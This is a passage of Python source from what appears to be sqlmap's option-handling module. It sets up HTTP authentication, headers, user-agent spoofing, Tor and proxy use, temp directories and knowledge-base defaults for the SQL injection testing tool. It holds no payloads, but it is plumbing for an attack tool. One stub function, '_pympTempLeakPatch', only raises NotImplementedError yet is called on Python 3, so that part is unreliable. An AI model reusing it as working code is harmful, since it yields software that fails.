 opener = _urllib.request.build_opener(*handlers)\n        opener.addheaders = []  # Note: clearing default \"User-Agent: Python-urllib/X.Y\"\n        _urllib.request.install_opener(opener)\n\ndef _setSafeVisit():\n    \"\"\"\n    Check and set the safe visit options.\n    \"\"\"\n    if not any((conf.safeUrl, conf.safeReqFile)):\n        return\n\n    if conf.safeReqFile:\n        checkFile(conf.safeReqFile)\n\n        raw = readCachedFileContent(conf.safeReqFile)\n        match = re.search(r\"\\A([A-Z]+) ([^ ]+) HTTP/[0-9.]+\\Z\", raw.split('\\n')[0].strip())\n\n        if match:\n            kb.safeReq.method = match.group(1)\n            kb.safeReq.url = match.group(2)\n            kb.safeReq.headers = {}\n\n            for line in raw.split('\\n')[1:]:\n                line = line.strip()\n                if line and ':' in line:\n                    key, value = line.split(':', 1)\n                    value = value.strip()\n                    kb.safeReq.headers[key] = value\n                    if key.upper() == HTTP_HEADER.HOST.upper():\n                        if not value.startswith(\"http\"):\n                            scheme = \"http\"\n                            if value.endswith(\":443\"):\n                                scheme = \"https\"\n                            value = \"%s://%s\" % (scheme, value)\n                        kb.safeReq.url = _urllib.parse.urljoin(value, kb.safeReq.url)\n                else:\n                    break\n\n            post = None\n\n            if '\\r\\n\\r\\n' in raw:\n                post = raw[raw.find('\\r\\n\\r\\n') + 4:]\n            elif '\\n\\n' in raw:\n                post = raw[raw.find('\\n\\n') + 2:]\n\n            if post and post.strip():\n                kb.safeReq.post = post\n            else:\n                kb.safeReq.post = None\n        else:\n            errMsg = \"invalid format of a safe request file\"\n            raise SqlmapSyntaxException(errMsg)\n    else:\n        if not re.search(r\"(?i)\\Ahttp[s]*://\", conf.safeUrl):\n            if \":443/\" in conf.safeUrl:\n                conf.safeUrl = \"https://%s\" % conf.safeUrl\n            else:\n                conf.safeUrl = \"http://%s\" % conf.safeUrl\n\n    if (conf.safeFreq or 0) <= 0:\n        errMsg = \"please provide a valid value (>0) for safe frequency ('--safe-freq') while using safe visit features\"\n        raise SqlmapSyntaxException(errMsg)\n\ndef _setPrefixSuffix():\n    if conf.prefix is not None and conf.suffix is not None:\n        # Create a custom boundary object for user's supplied prefix\n        # and suffix\n        boundary = AttribDict()\n\n        boundary.level = 1\n        boundary.clause = [0]\n        boundary.where = [1, 2, 3]\n        boundary.prefix = conf.prefix\n        boundary.suffix = conf.suffix\n\n        if \" like\" in boundary.suffix.lower():\n            if \"'\" in boundary.suffix.lower():\n                boundary.ptype = 3\n            elif '\"' in boundary.suffix.lower():\n                boundary.ptype = 5\n        elif \"'\" in boundary.suffix:\n            boundary.ptype = 2\n        elif '\"' in boundary.suffix:\n            boundary.ptype = 4\n        else:\n            boundary.ptype = 1\n\n        # user who provides --prefix/--suffix does not want other boundaries\n        # to be tested for\n        conf.boundaries = [boundary]\n\ndef _setAuthCred():\n    \"\"\"\n    Adds authentication credentials (if any) for current target to the password manager\n    (used by connection handler)\n    \"\"\"\n\n    if kb.passwordMgr and all(_ is not None for _ in (conf.scheme, conf.hostname, conf.port, conf.authUsername, conf.authPassword)):\n        kb.passwordMgr.add_password(None, \"%s://%s:%d\" % (conf.scheme, conf.hostname, conf.port), conf.authUsername, conf.authPassword)\n\ndef _setHTTPAuthentication():\n    \"\"\"\n    Check and set the HTTP(s) authentication method (Basic, Digest, Bearer, NTLM or PKI),\n    username and password for first three methods, or PEM private key file for\n    PKI authentication\n    \"\"\"\n\n    global authHandler\n\n    if not conf.authType and not conf.authCred and not conf.authFile:\n        return\n\n    if conf.authFile and not conf.authType:\n        conf.authType = AUTH_TYPE.PKI\n\n    elif conf.authType and not conf.authCred and not conf.authFile:\n        errMsg = \"you specified the HTTP authentication type, but \"\n        errMsg += \"did not provide the credentials\"\n        raise SqlmapSyntaxException(errMsg)\n\n    elif not conf.authType and conf.authCred:\n        errMsg = \"you specified the HTTP authentication credentials, \"\n        errMsg += \"but did not provide the type (e.g. --auth-type=\\\"basic\\\")\"\n        raise SqlmapSyntaxException(errMsg)\n\n    elif (conf.authType or \"\").lower() not in (AUTH_TYPE.BASIC, AUTH_TYPE.DIGEST, AUTH_TYPE.BEARER, AUTH_TYPE.NTLM, AUTH_TYPE.PKI):\n        errMsg = \"HTTP authentication type value must be \"\n        errMsg += \"Basic, Digest, Bearer, NTLM or PKI\"\n        raise SqlmapSyntaxException(errMsg)\n\n    if not conf.authFile:\n        debugMsg = \"setting the HTTP authentication type and credentials\"\n        logger.debug(debugMsg)\n\n        authType = conf.authType.lower()\n\n        if authType in (AUTH_TYPE.BASIC, AUTH_TYPE.DIGEST):\n            regExp = \"^(.*?):(.*?)$\"\n            errMsg = \"HTTP %s authentication credentials \" % authType\n            errMsg += \"value must be in format 'username:password'\"\n        elif authType == AUTH_TYPE.BEARER:\n            conf.httpHeaders.append((HTTP_HEADER.AUTHORIZATION, \"Bearer %s\" % conf.authCred.strip()))\n            return\n        elif authType == AUTH_TYPE.NTLM:\n            regExp = \"^(.*\\\\\\\\.*):(.*?)$\"\n            errMsg = \"HTTP NTLM authentication credentials value must \"\n            errMsg += \"be in format 'DOMAIN\\\\username:password'\"\n        elif authType == AUTH_TYPE.PKI:\n            errMsg = \"HTTP PKI authentication require \"\n            errMsg += \"usage of option `--auth-file`\"\n            raise SqlmapSyntaxException(errMsg)\n\n        aCredRegExp = re.search(regExp, conf.authCred)\n\n        if not aCredRegExp:\n            raise SqlmapSyntaxException(errMsg)\n\n        conf.authUsername = aCredRegExp.group(1)\n        conf.authPassword = aCredRegExp.group(2)\n\n        kb.passwordMgr = _urllib.request.HTTPPasswordMgrWithDefaultRealm()\n\n        _setAuthCred()\n\n        if authType == AUTH_TYPE.BASIC:\n            authHandler = SmartHTTPBasicAuthHandler(kb.passwordMgr)\n\n        elif authType == AUTH_TYPE.DIGEST:\n            authHandler = _urllib.request.HTTPDigestAuthHandler(kb.passwordMgr)\n\n        elif authType == AUTH_TYPE.NTLM:\n            try:\n                from ntlm import HTTPNtlmAuthHandler\n            except ImportError:\n                errMsg = \"sqlmap requires Python NTLM third-party library \"\n                errMsg += \"in order to authenticate via NTLM. Download from \"\n                errMsg += \"'https://github.com/mullender/python-ntlm'\"\n                raise SqlmapMissingDependence(errMsg)\n\n            authHandler = HTTPNtlmAuthHandler.HTTPNtlmAuthHandler(kb.passwordMgr)\n    else:\n        debugMsg = \"setting the HTTP(s) authentication PEM private key\"\n        logger.debug(debugMsg)\n\n        _ = safeExpandUser(conf.authFile)\n        checkFile(_)\n        authHandler = HTTPSPKIAuthHandler(_)\n\ndef _setHTTPExtraHeaders():\n    if conf.headers:\n        debugMsg = \"setting extra HTTP headers\"\n        logger.debug(debugMsg)\n\n        conf.headers = conf.headers.split(\"\\n\") if \"\\n\" in conf.headers else conf.headers.split(\"\\\\n\")\n\n        for headerValue in conf.headers:\n            if not headerValue.strip():\n                continue\n\n            if headerValue.count(':') >= 1:\n                header, value = (_.lstrip() for _ in headerValue.split(\":\", 1))\n\n                if header and value:\n                    conf.httpHeaders.append((header, value))\n            elif headerValue.startswith('@'):\n                checkFile(headerValue[1:])\n                kb.headersFile = headerValue[1:]\n            else:\n                errMsg = \"invalid header value: %s. Valid header format is 'name:value'\" % repr(headerValue).lstrip('u')\n                raise SqlmapSyntaxException(errMsg)\n\n    elif not conf.requestFile and len(conf.httpHeaders or []) < 2:\n        if conf.encoding:\n            conf.httpHeaders.append((HTTP_HEADER.ACCEPT_CHARSET, \"%s;q=0.7,*;q=0.1\" % conf.encoding))\n\n        # Invalidating any caching mechanism in between\n        # Reference: http://stackoverflow.com/a/1383359\n        conf.httpHeaders.append((HTTP_HEADER.CACHE_CONTROL, \"no-cache\"))\n\ndef _setHTTPUserAgent():\n    \"\"\"\n    Set the HTTP User-Agent header.\n    Depending on the user options it can be:\n\n        * The default sqlmap string\n        * A default value read as user option\n        * A random value read from a list of User-Agent headers from a\n          file choosed as user option\n    \"\"\"\n\n    debugMsg = \"setting the HTTP User-Agent header\"\n    logger.debug(debugMsg)\n\n    if conf.mobile:\n        if conf.randomAgent:\n            _ = random.sample([_[1] for _ in getPublicTypeMembers(MOBILES, True)], 1)[0]\n            conf.httpHeaders.append((HTTP_HEADER.USER_AGENT, _))\n        else:\n            message = \"which smartphone do you want sqlmap to imitate \"\n            message += \"through HTTP User-Agent header?\\n\"\n            items = sorted(getPublicTypeMembers(MOBILES, True))\n\n            for count in xrange(len(items)):\n                item = items[count]\n                message += \"[%d] %s%s\\n\" % (count + 1, item[0], \" (default)\" if item == MOBILES.IPHONE else \"\")\n\n            test = readInput(message.rstrip('\\n'), default=items.index(MOBILES.IPHONE) + 1)\n\n            try:\n                item = items[int(test) - 1]\n            except:\n                item = MOBILES.IPHONE\n\n            conf.httpHeaders.append((HTTP_HEADER.USER_AGENT, item[1]))\n\n    elif conf.agent:\n        conf.httpHeaders.append((HTTP_HEADER.USER_AGENT, conf.agent))\n\n    elif not conf.randomAgent:\n        _ = True\n\n        for header, _ in conf.httpHeaders:\n            if header.upper() == HTTP_HEADER.USER_AGENT.upper():\n                _ = False\n                break\n\n        if _:\n            conf.httpHeaders.append((HTTP_HEADER.USER_AGENT, DEFAULT_USER_AGENT))\n\n    else:\n        userAgent = fetchRandomAgent()\n\n        infoMsg = \"fetched random HTTP User-Agent header value '%s' from \" % userAgent\n        infoMsg += \"file '%s'\" % paths.USER_AGENTS\n        logger.info(infoMsg)\n\n        conf.httpHeaders.append((HTTP_HEADER.USER_AGENT, userAgent))\n\ndef _setHTTPReferer():\n    \"\"\"\n    Set the HTTP Referer\n    \"\"\"\n\n    if conf.referer:\n        debugMsg = \"setting the HTTP Referer header\"\n        logger.debug(debugMsg)\n\n        conf.httpHeaders.append((HTTP_HEADER.REFERER, conf.referer))\n\ndef _setHTTPHost():\n    \"\"\"\n    Set the HTTP Host\n    \"\"\"\n\n    if conf.host:\n        debugMsg = \"setting the HTTP Host header\"\n        logger.debug(debugMsg)\n\n        conf.httpHeaders.append((HTTP_HEADER.HOST, conf.host))\n\ndef _setHTTPCookies():\n    \"\"\"\n    Set the HTTP Cookie header\n    \"\"\"\n\n    if conf.cookie:\n        debugMsg = \"setting the HTTP Cookie header\"\n        logger.debug(debugMsg)\n\n        conf.httpHeaders.append((HTTP_HEADER.COOKIE, conf.cookie))\n\ndef _setHostname():\n    \"\"\"\n    Set value conf.hostname\n    \"\"\"\n\n    if conf.url:\n        try:\n            conf.hostname = _urllib.parse.urlsplit(conf.url).netloc.split(':')[0]\n        except ValueError as ex:\n            errMsg = \"problem occurred while \"\n            errMsg += \"parsing an URL '%s' ('%s')\" % (conf.url, getSafeExString(ex))\n            raise SqlmapDataException(errMsg)\n\ndef _setHTTPTimeout():\n    \"\"\"\n    Set the HTTP timeout\n    \"\"\"\n\n    if conf.timeout:\n        debugMsg = \"setting the HTTP timeout\"\n        logger.debug(debugMsg)\n\n        conf.timeout = float(conf.timeout)\n\n        if conf.timeout < 3.0:\n            warnMsg = \"the minimum HTTP timeout is 3 seconds, sqlmap \"\n            warnMsg += \"will going to reset it\"\n            logger.warning(warnMsg)\n\n            conf.timeout = 3.0\n    else:\n        conf.timeout = 30.0\n\n    try:\n        socket.setdefaulttimeout(conf.timeout)\n    except OverflowError as ex:\n        raise SqlmapValueException(\"invalid value used for option '--timeout' ('%s')\" % getSafeExString(ex))\n\ndef _checkDependencies():\n    \"\"\"\n    Checks for missing dependencies.\n    \"\"\"\n\n    if conf.dependencies:\n        checkDependencies()\n\ndef _createHomeDirectories():\n    \"\"\"\n    Creates directories inside sqlmap's home directory\n    \"\"\"\n\n    if conf.get(\"purge\"):\n        return\n\n    for context in (\"output\", \"history\"):\n        directory = paths[\"SQLMAP_%s_PATH\" % getUnicode(context).upper()]   # NOTE: https://github.com/sqlmapproject/sqlmap/issues/4363\n        try:\n            if not os.path.isdir(directory):\n                os.makedirs(directory)\n\n            _ = os.path.join(directory, randomStr())\n            open(_, \"w+b\").close()\n            os.remove(_)\n\n            if conf.get(\"outputDir\") and context == \"output\":\n                warnMsg = \"using '%s' as the %s directory\" % (directory, context)\n                logger.warning(warnMsg)\n        except (OSError, IOError) as ex:\n            tempDir = tempfile.mkdtemp(prefix=\"sqlmap%s\" % context)\n            warnMsg = \"unable to %s %s directory \" % (\"create\" if not os.path.isdir(directory) else \"write to the\", context)\n            warnMsg += \"'%s' (%s). \" % (directory, getUnicode(ex))\n            warnMsg += \"Using temporary directory '%s' instead\" % getUnicode(tempDir)\n            logger.warning(warnMsg)\n\n            paths[\"SQLMAP_%s_PATH\" % context.upper()] = tempDir\n\ndef _pympTempLeakPatch(tempDir):  # Cross-referenced function\n    raise NotImplementedError\n\ndef _createTemporaryDirectory():\n    \"\"\"\n    Creates temporary directory for this run.\n    \"\"\"\n\n    if conf.tmpDir:\n        try:\n            if not os.path.isdir(conf.tmpDir):\n                os.makedirs(conf.tmpDir)\n\n            _ = os.path.join(conf.tmpDir, randomStr())\n\n            open(_, \"w+b\").close()\n            os.remove(_)\n\n            tempfile.tempdir = conf.tmpDir\n\n            warnMsg = \"using '%s' as the temporary directory\" % conf.tmpDir\n            logger.warning(warnMsg)\n        except (OSError, IOError) as ex:\n            errMsg = \"there has been a problem while accessing \"\n            errMsg += \"temporary directory location(s) ('%s')\" % getSafeExString(ex)\n            raise SqlmapSystemException(errMsg)\n    else:\n        try:\n            if not os.path.isdir(tempfile.gettempdir()):\n                os.makedirs(tempfile.gettempdir())\n        except Exception as ex:\n            warnMsg = \"there has been a problem while accessing \"\n            warnMsg += \"system's temporary directory location(s) ('%s'). Please \" % getSafeExString(ex)\n            warnMsg += \"make sure that there is enough disk space left. If problem persists, \"\n            warnMsg += \"try to set environment variable 'TEMP' to a location \"\n            warnMsg += \"writeable by the current user\"\n            logger.warning(warnMsg)\n\n    if \"sqlmap\" not in (tempfile.tempdir or \"\") or conf.tmpDir and tempfile.tempdir == conf.tmpDir:\n        try:\n            tempfile.tempdir = tempfile.mkdtemp(prefix=\"sqlmap\", suffix=str(os.getpid()))\n        except:\n            tempfile.tempdir = os.path.join(paths.SQLMAP_HOME_PATH, \"tmp\", \"sqlmap%s%d\" % (randomStr(6), os.getpid()))\n\n    kb.tempDir = tempfile.tempdir\n\n    if not os.path.isdir(tempfile.tempdir):\n        try:\n            os.makedirs(tempfile.tempdir)\n        except Exception as ex:\n            errMsg = \"there has been a problem while setting \"\n            errMsg += \"temporary directory location ('%s')\" % getSafeExString(ex)\n            raise SqlmapSystemException(errMsg)\n\n    if six.PY3:\n        _pympTempLeakPatch(kb.tempDir)\n\ndef _cleanupOptions():\n    \"\"\"\n    Cleanup configuration attributes.\n    \"\"\"\n\n    if conf.encoding:\n        try:\n            codecs.lookup(conf.encoding)\n        except LookupError:\n            errMsg = \"unknown encoding '%s'\" % conf.encoding\n            raise SqlmapValueException(errMsg)\n\n    debugMsg = \"cleaning up configuration parameters\"\n    logger.debug(debugMsg)\n\n    width = getConsoleWidth()\n\n    if conf.eta:\n        conf.progressWidth = width - 26\n    else:\n        conf.progressWidth = width - 46\n\n    for key, value in conf.items():\n        if value and any(key.endswith(_) for _ in (\"Path\", \"File\", \"Dir\")):\n            if isinstance(value, str):\n                conf[key] = safeExpandUser(value)\n\n    if conf.testParameter:\n        conf.testParameter = urldecode(conf.testParameter)\n        conf.testParameter = [_.strip() for _ in re.split(PARAMETER_SPLITTING_REGEX, conf.testParameter)]\n    else:\n        conf.testParameter = []\n\n    if conf.ignoreCode:\n        if conf.ignoreCode == IGNORE_CODE_WILDCARD:\n            conf.ignoreCode = xrange(0, 1000)\n        else:\n            try:\n                conf.ignoreCode = [int(_) for _ in re.split(PARAMETER_SPLITTING_REGEX, conf.ignoreCode)]\n            except ValueError:\n                errMsg = \"option '--ignore-code' should contain a list of integer values or a wildcard value '%s'\" % IGNORE_CODE_WILDCARD\n                raise SqlmapSyntaxException(errMsg)\n    else:\n        conf.ignoreCode = []\n\n    if conf.abortCode:\n        try:\n            conf.abortCode = [int(_) for _ in re.split(PARAMETER_SPLITTING_REGEX, conf.abortCode)]\n        except ValueError:\n            errMsg = \"option '--abort-code' should contain a list of integer values\"\n            raise SqlmapSyntaxException(errMsg)\n    else:\n        conf.abortCode = []\n\n    if conf.paramFilter:\n        conf.paramFilter = [_.strip() for _ in re.split(PARAMETER_SPLITTING_REGEX, conf.paramFilter.upper())]\n    else:\n        conf.paramFilter = []\n\n    if conf.base64Parameter:\n        conf.base64Parameter = urldecode(conf.base64Parameter)\n        conf.base64Parameter = conf.base64Parameter.strip()\n        conf.base64Parameter = re.split(PARAMETER_SPLITTING_REGEX, conf.base64Parameter)\n    else:\n        conf.base64Parameter = []\n\n    if conf.agent:\n        conf.agent = re.sub(r\"[\\r\\n]\", \"\", conf.agent)\n\n    if conf.user:\n        conf.user = conf.user.replace(\" \", \"\")\n\n    if conf.rParam:\n        if all(_ in conf.rParam for _ in ('=', ',')):\n            original = conf.rParam\n            conf.rParam = []\n            for part in original.split(';'):\n                if '=' in part:\n                    left, right = part.split('=', 1)\n                    conf.rParam.append(left)\n                    kb.randomPool[left] = filterNone(_.strip() for _ in right.split(','))\n                else:\n                    conf.rParam.append(part)\n        else:\n            conf.rParam = conf.rParam.replace(\" \", \"\")\n            conf.rParam = re.split(PARAMETER_SPLITTING_REGEX, conf.rParam)\n    else:\n        conf.rParam = []\n\n    if conf.paramDel:\n        conf.paramDel = decodeStringEscape(conf.paramDel)\n\n    if conf.skip:\n        conf.skip = conf.skip.replace(\" \", \"\")\n        conf.skip = re.split(PARAMETER_SPLITTING_REGEX, conf.skip)\n    else:\n        conf.skip = []\n\n    if conf.cookie:\n        conf.cookie = re.sub(r\"[\\r\\n]\", \"\", conf.cookie)\n\n    if conf.delay:\n        conf.delay = float(conf.delay)\n\n    if conf.url:\n        conf.url = conf.url.strip().lstrip('/')\n        if not re.search(r\"\\A\\w+://\", conf.url):\n            conf.url = \"http://%s\" % conf.url\n\n    if conf.fileRead:\n        conf.fileRead = ntToPosixSlashes(normalizePath(conf.fileRead))\n\n    if conf.fileWrite:\n        conf.fileWrite = ntToPosixSlashes(normalizePath(conf.fileWrite))\n\n    if conf.fileDest:\n        conf.fileDest = ntToPosixSlashes(normalizePath(conf.fileDest))\n\n    if conf.msfPath:\n        conf.msfPath = ntToPosixSlashes(normalizePath(conf.msfPath))\n\n    if conf.tmpPath:\n        conf.tmpPath = ntToPosixSlashes(normalizePath(conf.tmpPath))\n\n    if any((conf.googleDork, conf.logFile, conf.bulkFile, conf.forms, conf.crawlDepth, conf.stdinPipe)):\n        conf.multipleTargets = True\n\n    if conf.optimize:\n        setOptimize()\n\n    if conf.os:\n        conf.os = conf.os.capitalize()\n\n    if conf.forceDbms:\n        conf.dbms = conf.forceDbms\n\n    if conf.dbms:\n        kb.dbmsFilter = []\n        for _ in conf.dbms.split(','):\n            for dbms, aliases in DBMS_ALIASES:\n                if _.strip().lower() in aliases:\n                    kb.dbmsFilter.append(dbms)\n                    conf.dbms = dbms if conf.dbms and ',' not in conf.dbms else None\n                    break\n\n    if conf.uValues:\n        conf.uCols = \"%d-%d\" % (1 + conf.uValues.count(','), 1 + conf.uValues.count(','))\n\n    if conf.testFilter:\n        conf.testFilter = conf.testFilter.strip('*+')\n        conf.testFilter = re.sub(r\"([^.])([*+])\", r\"\\g<1>.\\g<2>\", conf.testFilter)\n\n        try:\n            re.compile(conf.testFilter)\n        except re.error:\n            conf.testFilter = re.escape(conf.testFilter)\n\n    if conf.csrfToken:\n        original = conf.csrfToken\n        try:\n            re.compile(conf.csrfToken)\n\n            if re.escape(conf.csrfToken) != conf.csrfToken:\n                message = \"provided value for option '--csrf-token' is a regular expression? [y/N] \"\n                if not readInput(message, default='N', boolean=True):\n                    conf.csrfToken = re.escape(conf.csrfToken)\n        except re.error:\n            conf.csrfToken = re.escape(conf.csrfToken)\n        finally:\n            class _(six.text_type):\n                pass\n            conf.csrfToken = _(conf.csrfToken)\n            conf.csrfToken._original = original\n\n    if conf.testSkip:\n        conf.testSkip = conf.testSkip.strip('*+')\n        conf.testSkip = re.sub(r\"([^.])([*+])\", r\"\\g<1>.\\g<2>\", conf.testSkip)\n\n        try:\n            re.compile(conf.testSkip)\n        except re.error:\n            conf.testSkip = re.escape(conf.testSkip)\n\n    if \"timeSec\" not in kb.explicitSettings:\n        if conf.tor:\n            conf.timeSec = 2 * conf.timeSec\n            kb.adjustTimeDelay = ADJUST_TIME_DELAY.DISABLE\n\n            warnMsg = \"increasing default value for \"\n            warnMsg += \"option '--time-sec' to %d because \" % conf.timeSec\n            warnMsg += \"switch '--tor' was provided\"\n            logger.warning(warnMsg)\n    else:\n        kb.adjustTimeDelay = ADJUST_TIME_DELAY.DISABLE\n\n    if conf.retries:\n        conf.retries = min(conf.retries, MAX_CONNECT_RETRIES)\n\n    if conf.url:\n        match = re.search(r\"\\A(\\w+://)?([^/@?]+)@\", conf.url)\n        if match:\n            credentials = match.group(2)\n            conf.url = conf.url.replace(\"%s@\" % credentials, \"\", 1)\n\n            conf.authType = AUTH_TYPE.BASIC\n            conf.authCred = credentials if ':' in credentials else \"%s:\" % credentials\n\n    if conf.code:\n        conf.code = int(conf.code)\n\n    if conf.csvDel:\n        conf.csvDel = decodeStringEscape(conf.csvDel)\n\n    if conf.torPort and hasattr(conf.torPort, \"isdigit\") and conf.torPort.isdigit():\n        conf.torPort = int(conf.torPort)\n\n    if conf.torType:\n        conf.torType = conf.torType.upper()\n\n    if conf.outputDir:\n        paths.SQLMAP_OUTPUT_PATH = os.path.realpath(os.path.expanduser(conf.outputDir))\n        setPaths(paths.SQLMAP_ROOT_PATH)\n\n    if conf.string:\n        conf.string = decodeStringEscape(conf.string)\n\n    if conf.getAll:\n        for _ in WIZARD.ALL:\n            conf.__setitem__(_, True)\n\n    if conf.noCast:\n        DUMP_REPLACEMENTS.clear()\n\n    if conf.dumpFormat:\n        conf.dumpFormat = conf.dumpFormat.upper()\n\n    if conf.torType:\n        conf.torType = conf.torType.upper()\n\n    if conf.col:\n        conf.col = re.sub(r\"\\s*,\\s*\", ',', conf.col)\n\n    if conf.exclude:\n        regex = False\n        original = conf.exclude\n\n        if any(_ in conf.exclude for _ in ('+', '*')):\n            try:\n                re.compile(conf.exclude)\n            except re.error:\n                pass\n            else:\n                regex = True\n\n        if not regex:\n            conf.exclude = re.sub(r\"\\s*,\\s*\", ',', conf.exclude)\n            conf.exclude = r\"\\A%s\\Z\" % '|'.join(re.escape(_) for _ in conf.exclude.split(','))\n        else:\n            conf.exclude = re.sub(r\"(\\w+)\\$\", r\"\\g<1>\\$\", conf.exclude)\n\n        class _(six.text_type):\n            pass\n\n        conf.exclude = _(conf.exclude)\n        conf.exclude._original = original\n\n    if conf.binaryFields:\n        conf.binaryFields = conf.binaryFields.replace(\" \", \"\")\n        conf.binaryFields = re.split(PARAMETER_SPLITTING_REGEX, conf.binaryFields)\n\n    envProxy = max(os.environ.get(_, \"\") for _ in PROXY_ENVIRONMENT_VARIABLES)\n    if re.search(r\"\\A(https?|socks[45])://.+:\\d+\\Z\", envProxy) and conf.proxy is None:\n        debugMsg = \"using environment proxy '%s'\" % envProxy\n        logger.debug(debugMsg)\n\n        conf.proxy = envProxy\n\n    if any((conf.proxy, conf.proxyFile, conf.tor)):\n        conf.disablePrecon = True\n\n    if conf.dummy:\n        conf.batch = True\n\n    threadData = getCurrentThreadData()\n    threadData.reset()\n\ndef _cleanupEnvironment():\n    \"\"\"\n    Cleanup environment (e.g. from leftovers after --shell).\n    \"\"\"\n\n    if issubclass(_http_client.socket.socket, socks.socksocket):\n        socks.unwrapmodule(_http_client)\n\n    if hasattr(socket, \"_ready\"):\n        socket._ready.clear()\n\ndef _purge():\n    \"\"\"\n    Safely removes (purges) sqlmap data directory.\n    \"\"\"\n\n    if conf.purge:\n        purge(paths.SQLMAP_HOME_PATH)\n\ndef _setConfAttributes():\n    \"\"\"\n    This function set some needed attributes into the configuration\n    singleton.\n    \"\"\"\n\n    debugMsg = \"initializing the configuration\"\n    logger.debug(debugMsg)\n\n    conf.authUsername = None\n    conf.authPassword = None\n    conf.boundaries = []\n    conf.cj = None\n    conf.dbmsConnector = None\n    conf.dbmsHandler = None\n    conf.dnsServer = None\n    conf.dumpPath = None\n    conf.hashDB = None\n    conf.hashDBFile = None\n    conf.httpCollector = None\n    conf.httpHeaders = []\n    conf.hostname = None\n    conf.ipv6 = False\n    conf.multipleTargets = False\n    conf.outputPath = None\n    conf.paramDict = {}\n    conf.parameters = {}\n    conf.path = None\n    conf.port = None\n    conf.proxyList = None\n    conf.resultsFP = None\n    conf.scheme = None\n    conf.tests = []\n    conf.trafficFP = None\n    conf.HARCollectorFactory = None\n    conf.fileWriteType = None\n\ndef _setKnowledgeBaseAttributes(flushAll=True):\n    \"\"\"\n    This function set some needed attributes into the knowledge base\n    singleton.\n    \"\"\"\n\n    debugMsg = \"initializing the knowledge base\"\n    logger.debug(debugMsg)\n\n    kb.absFilePaths = set()\n    kb.adjustTimeDelay = None\n    kb.alerted = False\n    kb.aliasName = randomStr()\n    kb.alwaysRefresh = None\n    kb.arch = None\n    kb.authHeader = None\n    kb.bannerFp = AttribDict()\n    kb.base64Originals = {}\n    kb.binaryField = False\n    kb.browserVerification = None\n\n    kb.brute = AttribDict({\"tables\": [], \"columns\": []})\n    kb.bruteMode = False\n\n    kb.cache = AttribDict()\n    kb.cache.addrinfo = {}\n    kb.cache.content = {}\n    kb.cache.comparison = {}\n    kb.cache.encoding = {}\n    kb.cache.alphaBoundaries = None\n    kb.cache.hashRegex = None\n    kb.cache.intBoundaries = None\n    kb.cache.parsedDbms = {}\n    kb.cache.regex = {}\n    kb.cache.stdev = {}\n\n    kb.captchaDetected = None\n\n    kb.chars = AttribDict()\n    kb.chars.delimiter = randomStr(length=6, lowercase=True)\n    kb.chars.start = \"%s%s%s\" % (KB_CHARS_BOUNDARY_CHAR, randomStr(length=3, alphabet=KB_CHARS_LOW_FREQUENCY_ALPHABET), KB_CHARS_BOUNDARY_CHAR)\n    kb.chars.stop = \"%s%s%s\" % (KB_CHARS_BOUNDARY_CHAR, randomStr(length=3, alphabet=KB_CHARS_LOW_FREQUENCY_ALPHABET), KB_CHARS_BOUNDARY_CHAR)\n    kb.chars.at, kb.chars.space, kb.chars.dollar, kb.chars.hash_ = (\"%s%s%s\" % (KB_CHARS_BOUNDARY_CHAR, _, KB_CHARS_BOUNDARY_CHAR) for _ in randomStr(length=4, lowercase=True))\n\n    kb.choices = AttribDict(keycheck=False)\n    kb.codePage = None\n    kb.commonOutputs = None\n    kb.connErrorCounter = 0\n    kb.copyExecTest = None\n    kb.counters = {}\n    kb.customInjectionMark = CUSTOM_INJECTION_MARK_CHAR\n    kb.data = AttribDict()\n    kb.dataOutputFlag = False\n\n    # Active back-end DBMS fingerprint\n    kb.dbms = None\n    kb.dbmsFilter = []\n    kb.dbmsVersion = [UNKNOWN_DBMS_VERSION]\n\n    kb.delayCandidates = TIME_DELAY_CANDIDATES * [0]\n    kb.dep = None\n    kb.disableHtmlDecoding = False\n    kb.disableShiftTable = False\n    kb.dnsMode = False\n    kb.dnsTest = None\n    kb.docRoot = None\n    kb.droppingRequests = False\n    kb.dumpColumns = None\n    kb.dumpTable = None\n    kb.dumpKeyboardInterrupt = False\n    kb.dynamicMarkings = []\n    kb.dynamicParameter = False\n    kb.endDetection = False\n    kb.explicitSettings = set()\n    kb.extendTests = None\n    kb.errorChunkLength = None\n    kb.errorIsNone = True\n    kb.falsePositives = []\n    kb.fileReadMode = False\n    kb.fingerprinted = False\n    kb.followSitemapRecursion = None\n    kb.forcedDbms = None\n    kb.forcePartialUnion = False\n    kb.forceThreads = None\n    kb.forceWhere = None\n    kb.forkNote = None\n    kb.futileUnion = None\n    kb.fuzzUnionTest = None\n    kb.heavilyDynamic = False\n    kb.headersFile = None\n    kb.headersFp = {}\n    kb.heuristicDbms = None\n    kb.heuristicExtendedDbms = None\n    kb.heuristicMode = False\n    kb.heuristicPage = False\n    kb.heuristicTest = None\n    kb.hintValue = \"\"\n    kb.htmlFp = []\n    kb.httpErrorCodes = {}\n    kb.inferenceMode = False\n    kb.ignoreCasted = None\n    kb.ignoreNotFound = False\n    kb.ignoreTimeout = False\n    kb.identifiedWafs = set()\n    kb.injection = InjectionDict()\n    kb.injections = []\n    kb.jsonAggMode = False\n    kb.laggingChecked = False\n    kb.lastParserStatus = None\n\n    kb.locks = AttribDict()\n    for _ in (\"cache\", \"connError\", \"count\", \"handlers\", \"hint\", \"identYwaf\", \"index\", \"io\", \"limit\", \"liveCookies\", \"log\", \"socket\", \"redirect\", \"request\", \"value\"):\n        kb.locks[_] = threading.Lock()\n\n    kb.matchRatio = None\n    kb.maxConnectionsFlag = False\n    kb.mergeCookies = None\n    kb.multiThreadMode = False\n    kb.multipleCtrlC = False\n    kb.negativeLogic = False\n    kb.nchar = True\n    kb.nullConnection = None\n    kb.oldMsf = None\n    kb.orderByColumns = None\n    kb.originalCode = None\n    kb.originalPage = None\n    kb.originalPageTime = None\n    kb.originalTimeDelay = None\n    kb.originalUrls = dict()\n\n    # Back-end DBMS underlying operating system fingerprint via banner (-b)\n    # parsing\n    kb.os = None\n    kb.osVersion = None\n    kb.osSP = None\n\n    kb.pageCompress = True\n    kb.pageTemplate = None\n    kb.pageTemplates = dict()\n    kb.pageEncoding = DEFAULT_PAGE_ENCODING\n    kb.pageStable = None\n    kb.partRun = None\n    kb.permissionFlag = False\n    kb.place = None\n    kb.postHint = None\n    kb.postSpaceToPlus = False\n    kb.postUrlEncode = True\n    kb.prependFlag = False\n    kb.processResponseCounter = 0\n    kb.previousMethod = None\n    kb.processNonCustom = None\n    kb.processUserMarks = None\n    kb.proxyAuthHeader = None\n    kb.queryCounter = 0\n    kb.randomPool = {}\n    